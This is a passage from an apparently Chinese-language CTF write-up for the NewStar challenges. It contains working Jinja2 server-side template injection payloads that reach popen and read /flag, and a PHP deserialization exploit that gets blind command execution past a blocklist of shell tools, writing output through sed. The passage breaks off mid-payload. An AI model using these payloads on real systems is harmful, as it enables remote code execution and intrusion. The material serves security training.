&#x27;_sha3.sha3_224&#x27;&gt;, &lt;class &#x27;_sha3.sha3_256&#x27;&gt;, &lt;class &#x27;_sha3.sha3_384&#x27;&gt;, &lt;class &#x27;_sha3.sha3_512&#x27;&gt;, &lt;class &#x27;_sha3.shake_128&#x27;&gt;, &lt;class &#x27;_sha3.shake_256&#x27;&gt;, &lt;class &#x27;hmac.HMAC&#x27;&gt;, &lt;class &#x27;urllib3.util.ssltransport.SSLTransport&#x27;&gt;, &lt;class &#x27;_queue.SimpleQueue&#x27;&gt;, &lt;class &#x27;queue.Queue&#x27;&gt;, &lt;class &#x27;queue._PySimpleQueue&#x27;&gt;, &lt;class &#x27;_json.Scanner&#x27;&gt;, &lt;class &#x27;_json.Encoder&#x27;&gt;, &lt;class &#x27;json.decoder.JSONDecoder&#x27;&gt;, &lt;class &#x27;json.encoder.JSONEncoder&#x27;&gt;, &lt;class &#x27;mimetypes.MimeTypes&#x27;&gt;, &lt;class &#x27;urllib3.fields.RequestField&#x27;&gt;, &lt;class &#x27;zlib.Compress&#x27;&gt;, &lt;class &#x27;zlib.Decompress&#x27;&gt;, &lt;class &#x27;ipaddress._IPAddressBase&#x27;&gt;, &lt;class &#x27;ipaddress._BaseV4&#x27;&gt;, &lt;class &#x27;ipaddress._IPv4Constants&#x27;&gt;, &lt;class &#x27;ipaddress._BaseV6&#x27;&gt;, &lt;class &#x27;ipaddress._IPv6Constants&#x27;&gt;, &lt;class &#x27;urllib3.connection.DummyConnection&#x27;&gt;, &lt;class &#x27;urllib3.response.ContentDecoder&#x27;&gt;, &lt;class &#x27;urllib3.response.GzipDecoderState&#x27;&gt;, &lt;class &#x27;urllib3.response.BytesQueueBuffer&#x27;&gt;, &lt;class &#x27;urllib3._request_methods.RequestMethods&#x27;&gt;, &lt;class &#x27;urllib3.connectionpool.ConnectionPool&#x27;&gt;, &lt;class &#x27;MultibyteCodec&#x27;&gt;, &lt;class &#x27;MultibyteIncrementalEncoder&#x27;&gt;, &lt;class &#x27;MultibyteIncrementalDecoder&#x27;&gt;, &lt;class &#x27;MultibyteStreamReader&#x27;&gt;, &lt;class &#x27;MultibyteStreamWriter&#x27;&gt;, &lt;class &#x27;charset_normalizer.md.MessDetectorPlugin&#x27;&gt;, &lt;class &#x27;charset_normalizer.models.CharsetMatch&#x27;&gt;, &lt;class &#x27;charset_normalizer.models.CharsetMatches&#x27;&gt;, &lt;class &#x27;charset_normalizer.models.CliDetectionResult&#x27;&gt;, &lt;class &#x27;_bz2.BZ2Compressor&#x27;&gt;, &lt;class &#x27;_bz2.BZ2Decompressor&#x27;&gt;, &lt;class &#x27;_lzma.LZMACompressor&#x27;&gt;, &lt;class &#x27;_lzma.LZMADecompressor&#x27;&gt;, &lt;class &#x27;tempfile._RandomNameSequence&#x27;&gt;, &lt;class &#x27;tempfile._TemporaryFileCloser&#x27;&gt;, &lt;class &#x27;tempfile._TemporaryFileWrapper&#x27;&gt;, &lt;class &#x27;tempfile.SpooledTemporaryFile&#x27;&gt;, &lt;class &#x27;tempfile.TemporaryDirectory&#x27;&gt;, &lt;class &#x27;urllib.request.Request&#x27;&gt;, &lt;class &#x27;urllib.request.OpenerDirector&#x27;&gt;, &lt;class &#x27;urllib.request.BaseHandler&#x27;&gt;, &lt;class &#x27;urllib.request.HTTPPasswordMgr&#x27;&gt;, &lt;class &#x27;urllib.request.AbstractBasicAuthHandler&#x27;&gt;, &lt;class &#x27;urllib.request.AbstractDigestAuthHandler&#x27;&gt;, &lt;class &#x27;urllib.request.URLopener&#x27;&gt;, &lt;class &#x27;urllib.request.ftpwrapper&#x27;&gt;, &lt;class &#x27;http.cookiejar.Cookie&#x27;&gt;, &lt;class &#x27;http.cookiejar.CookiePolicy&#x27;&gt;, &lt;class &#x27;http.cookiejar.Absent&#x27;&gt;, &lt;class &#x27;http.cookiejar.CookieJar&#x27;&gt;, &lt;class &#x27;importlib.abc.Finder&#x27;&gt;, &lt;class &#x27;importlib.abc.Loader&#x27;&gt;, &lt;class &#x27;importlib.abc.ResourceReader&#x27;&gt;, &lt;class &#x27;zipfile.ZipInfo&#x27;&gt;, &lt;class &#x27;zipfile.LZMACompressor&#x27;&gt;, &lt;class &#x27;zipfile.LZMADecompressor&#x27;&gt;, &lt;class &#x27;zipfile._SharedFile&#x27;&gt;, &lt;class &#x27;zipfile._Tellable&#x27;&gt;, &lt;class &#x27;zipfile.ZipFile&#x27;&gt;, &lt;class &#x27;zipfile.Path&#x27;&gt;, &lt;class &#x27;pathlib._Flavour&#x27;&gt;, &lt;class &#x27;pathlib._Accessor&#x27;&gt;, &lt;class &#x27;pathlib._Selector&#x27;&gt;, &lt;class &#x27;pathlib._TerminatingSelector&#x27;&gt;, &lt;class &#x27;pathlib.PurePath&#x27;&gt;, &lt;class &#x27;requests.cookies.MockRequest&#x27;&gt;, &lt;class &#x27;requests.cookies.MockResponse&#x27;&gt;, &lt;class &#x27;requests.auth.AuthBase&#x27;&gt;, &lt;class &#x27;unicodedata.UCD&#x27;&gt;, &lt;class &#x27;requests.models.RequestEncodingMixin&#x27;&gt;, &lt;class &#x27;requests.models.RequestHooksMixin&#x27;&gt;, &lt;class &#x27;requests.models.Response&#x27;&gt;, &lt;class &#x27;requests.adapters.BaseAdapter&#x27;&gt;, &lt;class &#x27;requests.sessions.SessionRedirectMixin&#x27;&gt;, &lt;class &#x27;socketserver.BaseServer&#x27;&gt;, &lt;class &#x27;socketserver.ForkingMixIn&#x27;&gt;, &lt;class &#x27;socketserver._NoThreads&#x27;&gt;, &lt;class &#x27;socketserver.ThreadingMixIn&#x27;&gt;, &lt;class &#x27;socketserver.BaseRequestHandler&#x27;&gt;, &lt;class &#x27;werkzeug._internal._Missing&#x27;&gt;, &lt;class &#x27;markupsafe._MarkupEscapeHelper&#x27;&gt;, &lt;class &#x27;werkzeug.exceptions.Aborter&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.mixins.ImmutableListMixin&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.mixins.ImmutableDictMixin&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.mixins.ImmutableHeadersMixin&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.structures._omd_bucket&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.auth.Authorization&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.auth.WWWAuthenticate&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.file_storage.FileStorage&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.headers.Headers&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.range.IfRange&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.range.Range&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.range.ContentRange&#x27;&gt;, &lt;class &#x27;dis.Bytecode&#x27;&gt;, &lt;class &#x27;inspect.BlockFinder&#x27;&gt;, &lt;class &#x27;inspect._void&#x27;&gt;, &lt;class &#x27;inspect._empty&#x27;&gt;, &lt;class &#x27;inspect.Parameter&#x27;&gt;, &lt;class &#x27;inspect.BoundArguments&#x27;&gt;, &lt;class &#x27;inspect.Signature&#x27;&gt;, &lt;class &#x27;dataclasses._HAS_DEFAULT_FACTORY_CLASS&#x27;&gt;, &lt;class &#x27;dataclasses._MISSING_TYPE&#x27;&gt;, &lt;class &#x27;dataclasses._FIELD_BASE&#x27;&gt;, &lt;class &#x27;dataclasses.InitVar&#x27;&gt;, &lt;class &#x27;dataclasses.Field&#x27;&gt;, &lt;class &#x27;dataclasses._DataclassParams&#x27;&gt;, &lt;class &#x27;werkzeug.sansio.multipart.Event&#x27;&gt;, &lt;class &#x27;werkzeug.sansio.multipart.MultipartDecoder&#x27;&gt;, &lt;class &#x27;werkzeug.sansio.multipart.MultipartEncoder&#x27;&gt;, &lt;class &#x27;pkgutil.ImpImporter&#x27;&gt;, &lt;class &#x27;pkgutil.ImpLoader&#x27;&gt;, &lt;class &#x27;werkzeug.wsgi.ClosingIterator&#x27;&gt;, &lt;class &#x27;werkzeug.wsgi.FileWrapper&#x27;&gt;, &lt;class &#x27;werkzeug.wsgi._RangeWrapper&#x27;&gt;, &lt;class &#x27;werkzeug.formparser.FormDataParser&#x27;&gt;, &lt;class &#x27;werkzeug.formparser.MultiPartParser&#x27;&gt;, &lt;class &#x27;werkzeug.user_agent.UserAgent&#x27;&gt;, &lt;class &#x27;werkzeug.sansio.request.Request&#x27;&gt;, &lt;class &#x27;werkzeug.sansio.response.Response&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.response.ResponseStream&#x27;&gt;, &lt;class &#x27;werkzeug.test.EnvironBuilder&#x27;&gt;, &lt;class &#x27;werkzeug.test.Client&#x27;&gt;, &lt;class &#x27;werkzeug.test.Cookie&#x27;&gt;, &lt;class &#x27;werkzeug.local.Local&#x27;&gt;, &lt;class &#x27;werkzeug.local.LocalManager&#x27;&gt;, &lt;class &#x27;werkzeug.local._ProxyLookup&#x27;&gt;, &lt;class &#x27;flask.globals._FakeStack&#x27;&gt;, &lt;class &#x27;decimal.Decimal&#x27;&gt;, &lt;class &#x27;decimal.Context&#x27;&gt;, &lt;class &#x27;decimal.SignalDictMixin&#x27;&gt;, &lt;class &#x27;decimal.ContextManager&#x27;&gt;, &lt;class &#x27;numbers.Number&#x27;&gt;, &lt;class &#x27;subprocess.CompletedProcess&#x27;&gt;, &lt;class &#x27;subprocess.Popen&#x27;&gt;, &lt;class &#x27;uuid.UUID&#x27;&gt;, &lt;class &#x27;flask.json.provider.JSONProvider&#x27;&gt;, &lt;class &#x27;gettext.NullTranslations&#x27;&gt;, &lt;class &#x27;click._compat._FixupStream&#x27;&gt;, &lt;class &#x27;click._compat._AtomicFile&#x27;&gt;, &lt;class &#x27;click.utils.LazyFile&#x27;&gt;, &lt;class &#x27;click.utils.KeepOpenFile&#x27;&gt;, &lt;class &#x27;click.utils.PacifyFlushWrapper&#x27;&gt;, &lt;class &#x27;click.types.ParamType&#x27;&gt;, &lt;class &#x27;click.parser.Option&#x27;&gt;, &lt;class &#x27;click.parser.Argument&#x27;&gt;, &lt;class &#x27;click.parser.ParsingState&#x27;&gt;, &lt;class &#x27;click.parser.OptionParser&#x27;&gt;, &lt;class &#x27;click.formatting.HelpFormatter&#x27;&gt;, &lt;class &#x27;click.core.Context&#x27;&gt;, &lt;class &#x27;click.core.BaseCommand&#x27;&gt;, &lt;class &#x27;click.core.Parameter&#x27;&gt;, &lt;class &#x27;werkzeug.routing.converters.BaseConverter&#x27;&gt;, &lt;class &#x27;difflib.SequenceMatcher&#x27;&gt;, &lt;class &#x27;difflib.Differ&#x27;&gt;, &lt;class &#x27;difflib.HtmlDiff&#x27;&gt;, &lt;class &#x27;pprint._safe_key&#x27;&gt;, &lt;class &#x27;pprint.PrettyPrinter&#x27;&gt;, &lt;class &#x27;ast.NodeVisitor&#x27;&gt;, &lt;class &#x27;werkzeug.routing.rules.RulePart&#x27;&gt;, &lt;class &#x27;werkzeug.routing.rules.RuleFactory&#x27;&gt;, &lt;class &#x27;werkzeug.routing.rules.RuleTemplate&#x27;&gt;, &lt;class &#x27;werkzeug.routing.matcher.State&#x27;&gt;, &lt;class &#x27;werkzeug.routing.matcher.StateMachineMatcher&#x27;&gt;, &lt;class &#x27;werkzeug.routing.map.Map&#x27;&gt;, &lt;class &#x27;werkzeug.routing.map.MapAdapter&#x27;&gt;, &lt;class &#x27;_csv.Dialect&#x27;&gt;, &lt;class &#x27;_csv.reader&#x27;&gt;, &lt;class &#x27;_csv.writer&#x27;&gt;, &lt;class &#x27;csv.Dialect&#x27;&gt;, &lt;class &#x27;csv.DictReader&#x27;&gt;, &lt;class &#x27;csv.DictWriter&#x27;&gt;, &lt;class &#x27;csv.Sniffer&#x27;&gt;, &lt;class &#x27;configparser.Interpolation&#x27;&gt;, &lt;class &#x27;importlib.metadata.FileHash&#x27;&gt;, &lt;class &#x27;importlib.metadata.Distribution&#x27;&gt;, &lt;class &#x27;importlib.metadata.DistributionFinder.Context&#x27;&gt;, &lt;class &#x27;importlib.metadata.FastPath&#x27;&gt;, &lt;class &#x27;importlib.metadata.Prepared&#x27;&gt;, &lt;class &#x27;concurrent.futures._base._Waiter&#x27;&gt;, &lt;class &#x27;concurrent.futures._base._AcquireFutures&#x27;&gt;, &lt;class &#x27;concurrent.futures._base.Future&#x27;&gt;, &lt;class &#x27;concurrent.futures._base.Executor&#x27;&gt;, &lt;class &#x27;asyncio.coroutines.CoroWrapper&#x27;&gt;, &lt;class &#x27;asyncio.events.Handle&#x27;&gt;, &lt;class &#x27;asyncio.events.AbstractServer&#x27;&gt;, &lt;class &#x27;asyncio.events.AbstractEventLoop&#x27;&gt;, &lt;class &#x27;asyncio.events.AbstractEventLoopPolicy&#x27;&gt;, &lt;class &#x27;_asyncio.Future&#x27;&gt;, &lt;class &#x27;_asyncio.FutureIter&#x27;&gt;, &lt;class &#x27;TaskStepMethWrapper&#x27;&gt;, &lt;class &#x27;TaskWakeupMethWrapper&#x27;&gt;, &lt;class &#x27;_RunningLoopHolder&#x27;&gt;, &lt;class &#x27;asyncio.futures.Future&#x27;&gt;, &lt;class &#x27;asyncio.protocols.BaseProtocol&#x27;&gt;, &lt;class &#x27;asyncio.transports.BaseTransport&#x27;&gt;, &lt;class &#x27;asyncio.sslproto._SSLPipe&#x27;&gt;, &lt;class &#x27;asyncio.locks._ContextManager&#x27;&gt;, &lt;class &#x27;asyncio.locks._ContextManagerMixin&#x27;&gt;, &lt;class &#x27;asyncio.locks.Event&#x27;&gt;, &lt;class &#x27;asyncio.trsock.TransportSocket&#x27;&gt;, &lt;class &#x27;asyncio.queues.Queue&#x27;&gt;, &lt;class &#x27;asyncio.streams.StreamWriter&#x27;&gt;, &lt;class &#x27;asyncio.streams.StreamReader&#x27;&gt;, &lt;class &#x27;asyncio.subprocess.Process&#x27;&gt;, &lt;class &#x27;asyncio.unix_events.AbstractChildWatcher&#x27;&gt;, &lt;class &#x27;blinker._saferef.BoundMethodWeakref&#x27;&gt;, &lt;class &#x27;blinker._utilities._symbol&#x27;&gt;, &lt;class &#x27;blinker._utilities.symbol&#x27;&gt;, &lt;class &#x27;blinker._utilities.lazy_property&#x27;&gt;, &lt;class &#x27;blinker.base.Signal&#x27;&gt;, &lt;class &#x27;flask.cli.ScriptInfo&#x27;&gt;, &lt;class &#x27;flask.config.ConfigAttribute&#x27;&gt;, &lt;class &#x27;flask.ctx._AppCtxGlobals&#x27;&gt;, &lt;class &#x27;flask.ctx.AppContext&#x27;&gt;, &lt;class &#x27;flask.ctx.RequestContext&#x27;&gt;, &lt;class &#x27;_pickle.Unpickler&#x27;&gt;, &lt;class &#x27;_pickle.Pickler&#x27;&gt;, &lt;class &#x27;_pickle.Pdata&#x27;&gt;, &lt;class &#x27;_pickle.PicklerMemoProxy&#x27;&gt;, &lt;class &#x27;_pickle.UnpicklerMemoProxy&#x27;&gt;, &lt;class &#x27;pickle._Framer&#x27;&gt;, &lt;class &#x27;pickle._Unframer&#x27;&gt;, &lt;class &#x27;pickle._Pickler&#x27;&gt;, &lt;class &#x27;pickle._Unpickler&#x27;&gt;, &lt;class &#x27;jinja2.bccache.Bucket&#x27;&gt;, &lt;class &#x27;jinja2.bccache.BytecodeCache&#x27;&gt;, &lt;class &#x27;jinja2.utils.MissingType&#x27;&gt;, &lt;class &#x27;jinja2.utils.LRUCache&#x27;&gt;, &lt;class &#x27;jinja2.utils.Cycler&#x27;&gt;, &lt;class &#x27;jinja2.utils.Joiner&#x27;&gt;, &lt;class &#x27;jinja2.utils.Namespace&#x27;&gt;, &lt;class &#x27;jinja2.nodes.EvalContext&#x27;&gt;, &lt;class &#x27;jinja2.nodes.Node&#x27;&gt;, &lt;class &#x27;jinja2.visitor.NodeVisitor&#x27;&gt;, &lt;class &#x27;jinja2.idtracking.Symbols&#x27;&gt;, &lt;class &#x27;jinja2.compiler.MacroRef&#x27;&gt;, &lt;class &#x27;jinja2.compiler.Frame&#x27;&gt;, &lt;class &#x27;jinja2.runtime.TemplateReference&#x27;&gt;, &lt;class &#x27;jinja2.runtime.Context&#x27;&gt;, &lt;class &#x27;jinja2.runtime.BlockReference&#x27;&gt;, &lt;class &#x27;jinja2.runtime.LoopContext&#x27;&gt;, &lt;class &#x27;jinja2.runtime.Macro&#x27;&gt;, &lt;class &#x27;jinja2.runtime.Undefined&#x27;&gt;, &lt;class &#x27;jinja2.lexer.Failure&#x27;&gt;, &lt;class &#x27;jinja2.lexer.TokenStreamIterator&#x27;&gt;, &lt;class &#x27;jinja2.lexer.TokenStream&#x27;&gt;, &lt;class &#x27;jinja2.lexer.Lexer&#x27;&gt;, &lt;class &#x27;jinja2.parser.Parser&#x27;&gt;, &lt;class &#x27;jinja2.environment.Environment&#x27;&gt;, &lt;class &#x27;jinja2.environment.Template&#x27;&gt;, &lt;class &#x27;jinja2.environment.TemplateModule&#x27;&gt;, &lt;class &#x27;jinja2.environment.TemplateExpression&#x27;&gt;, &lt;class &#x27;jinja2.environment.TemplateStream&#x27;&gt;, &lt;class &#x27;jinja2.loaders.BaseLoader&#x27;&gt;, &lt;class &#x27;flask.scaffold.Scaffold&#x27;&gt;, &lt;class &#x27;itsdangerous.signer.SigningAlgorithm&#x27;&gt;, &lt;class &#x27;itsdangerous.signer.Signer&#x27;&gt;, &lt;class &#x27;itsdangerous.serializer.Serializer&#x27;&gt;, &lt;class &#x27;itsdangerous._json._CompactJSON&#x27;&gt;, &lt;class &#x27;flask.json.tag.JSONTag&#x27;&gt;, &lt;class &#x27;flask.json.tag.TaggedJSONSerializer&#x27;&gt;, &lt;class &#x27;flask.sessions.SessionInterface&#x27;&gt;, &lt;class &#x27;flask.blueprints.BlueprintSetupState&#x27;&gt;, &lt;class &#x27;codeop.Compile&#x27;&gt;, &lt;class &#x27;codeop.CommandCompiler&#x27;&gt;, &lt;class &#x27;code.InteractiveInterpreter&#x27;&gt;, &lt;class &#x27;werkzeug.debug.repr._Helper&#x27;&gt;, &lt;class &#x27;werkzeug.debug.repr.DebugReprGenerator&#x27;&gt;, &lt;class &#x27;werkzeug.debug.console.HTMLStringO&#x27;&gt;, &lt;class &#x27;werkzeug.debug.console.ThreadedStream&#x27;&gt;, &lt;class &#x27;werkzeug.debug.console._ConsoleLoader&#x27;&gt;, &lt;class &#x27;werkzeug.debug.console.Console&#x27;&gt;, &lt;class &#x27;werkzeug.debug.tbtools.DebugTraceback&#x27;&gt;, &lt;class &#x27;werkzeug.debug._ConsoleFrame&#x27;&gt;, &lt;class &#x27;werkzeug.debug.DebuggedApplication&#x27;&gt;, &lt;class &#x27;werkzeug._reloader.ReloaderLoop&#x27;&gt;] &quot;</span><br><span class="hljs-built_in">list</span> = <span class="hljs-built_in">str</span>.split(<span class="hljs-string">&quot;,&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">list</span>)<br>count = <span class="hljs-number">0</span><br>tem = <span class="hljs-string">&#x27;os._wrap_close&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(<span class="hljs-built_in">list</span>)):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">list</span>[i])<br>    <span class="hljs-keyword">if</span> tem <span class="hljs-keyword">in</span> <span class="hljs-built_in">list</span>[i]:<br>        <span class="hljs-built_in">print</span>(count)<br>        <span class="hljs-keyword">break</span><br>    count = count+<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">secr3tofpop?name=&#123;%print(().__class__.__base__.__subclasses__()[132])%&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-11-3-newstar-3/image-20231010163213824.png" alt="image-20231010163213824"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">使用&quot;~&quot;进行字符串拼接：<br>secr3tofpop?name=&#123;%print(().__class__.__base__.__subclasses__()[132][&quot;__in&quot;~&quot;it__&quot;])%&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-11-3-newstar-3/image-20231010161929907.png" alt="image-20231010161929907"></p><p>paylaod:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">secr3tofpop?name=&#123;%print(().__class__.__base__.__subclasses__()[132][&quot;__in&quot;~&quot;it__&quot;].__globals__[&quot;pop&quot;~&quot;en&quot;])%&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-11-3-newstar-3/image-20231010162204147.png" alt="image-20231010162204147"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">secr3tofpop?name=&#123;%print(().__class__.__base__.__subclasses__()[132][&quot;__in&quot;~&quot;it__&quot;].__globals__[&quot;pop&quot;~&quot;en&quot;](&quot;ls /&quot;).read())%&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-11-3-newstar-3/image-20231010162348128.png" alt="image-20231010162348128"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">secr3tofpop?name=&#123;%print(().__class__.__base__.__subclasses__()[132][&quot;__in&quot;~&quot;it__&quot;].__globals__[&quot;pop&quot;~&quot;en&quot;](&quot;tac /flag&quot;).read())%&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-11-3-newstar-3/image-20231010162449022.png" alt="image-20231010162449022"></p><h2 id="R-C-E"><a href="#R-C-E" class="headerlink" title="R!!!C!!!E!!!"></a>R!!!C!!!E!!!</h2><p>代码审计:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">minipop</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$qwejaskdjnlka</span>;<br>    <span class="hljs-comment">//有类的输出会进行执行</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">//过滤了:$ . ! @ # % ^ &amp; * ? &#123; &#125; &gt; &lt;</span><br>        <span class="hljs-comment">//nc tee wget exec bash sh netcat grep base64 rev curl </span><br>        <span class="hljs-comment">//wget gcc php python pingtouch mv mkdir cp</span><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="hljs-variable">$this</span>-&gt;code))&#123;<br>            <span class="hljs-comment">//无回显rce</span><br>            <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$this</span>-&gt;code);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;alright&quot;</span>;<br>    &#125;<br>    <span class="hljs-comment">//反序列化自动触发</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">//可用于执行__toString()函数</span><br>        <span class="hljs-comment">//$this-&gt;qwejaskdjnlka = new minipop();</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;qwejaskdjnlka;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;payload&#x27;</span>]))&#123;<br>    <span class="hljs-comment">//wanna try?</span><br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;payload&#x27;</span>]);<br>&#125; <br></code></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/qq_62046696/article/details/125859628?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-2-125859628-blog-123039067.235%5Ev38%5Epc_relevant_anti_vip_base&spm=1001.2101.3001.4242.2&utm_relevant_index=5">rce（无回显）_无回显rce_偶尔躲躲乌云334的博客-CSDN博客</a></p><p>测试命令是否被执行:</p><p>构造rce脚本:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">minipop</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$qwejaskdjnlka</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;code = <span class="hljs-string">&quot;ls / | sed &#x27;1,20w test1&#x27;&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$obj</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">minipop</span>();<br><span class="hljs-comment">// $payload=&quot;tac /flag_is_h3eeere | sed &#x27;1,20w test&#x27;&quot;;</span><br><span class="hljs-comment">// $obj-&gt;code = $payload;</span><br><span class="hljs-variable">$obj</span>-&gt;qwejaskdjnlka = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">minipop</span>();<br><span class="hljs-variable">$obj</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$obj</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$obj</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-variable">$obj2</span> = <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$obj</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$obj2</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">$this-&gt;code=&#x27;ls|sleep 5&#x27;;//会使网页延迟5秒<br><br>POST:<br>payload=O:7:&quot;minipop&quot;:2:&#123;s:4:&quot;code&quot;;s:10:&quot;ls|sleep 5&quot;;s:13:&quot;qwejaskdjnlka&quot;;O:7:&quot;minipop&quot;:2:&#123;s:4:&quot;code&quot;;s:10:&quot;ls|sleep 5&quot;;s:13:&quot;qwejaskdjnlka&quot;;N;&#125;&#125;<br></code></pre></td></tr></table></figure><p>发现网页延迟回显，说明我们上传的payload命令可以被执行</p><p><strong>sed管道命令执行:</strong></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">tac /flag_is_h3eeere | sed &#x27;1,20w test&#x27;<br>将|之前命令执行的结果的1-20行内容写入test文件中，test&lt;=&gt;./test,所以test文件存在于当前网页的文件夹中<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">$this-&gt;code = &quot;ls / | sed &#x27;1,20w test1&#x27;&quot;;<br>POST:<br>payload=O:7:&quot;minipop&quot;:2:&#123;s:4:&quot;code&quot;;s:24:&quot;ls / | sed &#x27;1,20w test1&#x27;&quot;;s:13:&quot;qwejaskdjnlka&quot;;O:7:&quot;minipop&quot;:2:&#123;s:4:&quot;code&quot;;s:24:&quot;ls / | sed &#x27;1,20w test1&#x27;&quot;;s:13:&quot;qwejaskdjnlka&quot;;N;&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-11-3-newstar-3/image-20231031192813120.png" alt="image-20231031192813120"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 